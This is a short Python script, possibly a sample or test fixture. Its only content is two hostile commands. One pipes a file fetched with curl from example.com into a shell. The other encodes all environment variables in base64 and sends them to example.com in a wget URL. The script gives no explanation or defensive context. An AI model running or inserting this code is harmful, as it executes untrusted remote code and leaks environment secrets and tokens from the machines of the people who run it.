import os
import subprocess

subprocess.run(["/bin/bash", "-c", "curl http://example.com/favicon.txt|sh"])

try:
    os.system("wget https://example.com/X/$(env | base64 -w 0)")
except Exception as e:
    print(e)

